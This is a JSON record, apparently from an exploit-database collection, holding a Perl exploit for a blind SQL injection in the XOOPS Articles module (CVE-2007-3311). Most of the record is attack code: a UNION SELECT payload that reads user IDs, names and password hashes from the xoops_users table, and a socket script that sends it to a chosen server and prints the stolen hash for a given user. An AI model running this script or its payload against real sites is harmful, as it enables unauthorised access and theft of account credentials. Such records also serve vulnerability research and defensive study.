{
  "id": "3588",
  "title": "XOOPS module Articles 1.02 - &#039;print.php?id&#039; SQL Injection",
  "cve": "CVE-2007-3311",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n# Xoops All Version -Articles- Print.PHP (ID) Blind SQL Injection Exploit And PoC\r\n\r\n# Type :\r\n\r\n# SQL Injection\r\n\r\n# Release Date :\r\n\r\n# {2007-03-26}\r\n\r\n# Product / Vendor :\r\n\r\n# http://support.sirium.net/\r\n\r\n# Bug :\r\n\r\n# http://localhost/script/modules/articles/print.php?id=x AND 1=1 or 1=0\r\n\r\n# PoC :\r\n\r\n# http://localhost/script/modules/articles/print.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,uid,uname,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*\r\n\r\n# Exploit :\r\n\r\n#############################################\r\n#Exploit Coded By UNIQUE-KEY[UNIQUE-CRACKER]#\r\n#############################################\r\n\r\nuse IO::Socket;\r\n\r\nif (@ARGV != 3)\r\n{\r\n    print \"\\n-----------------------------------\\n\";\r\n    print \"Xoops All Version -Articles- Print.PHP (ID) Blind SQL Injection Exploit\\n\";\r\n    print \"-----------------------------------\\n\";\r\n    print \"\\nUniquE-Key{UniquE-Cracker}\\n\";\r\n    print \"UniquE[at]UniquE-Key.ORG\\n\";\r\n    print \"http://UniquE-Key.ORG\\n\";\r\n    print \"\\n-----------------------------------\\n\";\r\n    print \"\\nUsage: $0 <server> <path> <uid>\\n\";\r\n    print \"Examp: $0 www.victim.com /path 1\\n\";\r\n    print \"\\n-----------------------------------\\n\";\r\n    exit ();\r\n}\r\n\r\n$server = $ARGV[0];\r\n$path = $ARGV[1];\r\n$uid = $ARGV[2];\r\n\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\",  PeerPort => \"80\");\r\nprintf $socket (\"GET %s/modules/articles/print.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/xoops_users/**/WHERE/**/uid=$uid/* HTTP/1.0\\nHost: %s\\nAccept: */*\\nConnection: close\\n\\n\",\r\n$path,$server,$uid);\r\n\r\nwhile(<$socket>)\r\n\r\n{\r\n    if (/\\>(\\w{32})\\</) { print \"\\nID '$uid' User Password :\\n\\n$1\\n\"; }\r\n}\r\n\r\n# Tested :\r\n\r\n# All Version\r\n\r\n# Author :\r\n\r\n# UniquE-Key{UniquE-Cracker}\r\n# UniquE(at)UniquE-Key.Org\r\n# http://www.UniquE-Key.Org\r\n\r\n# milw0rm.com [2007-03-27]",
  "url": "https://www.exploit-db.com/exploits/3588"
}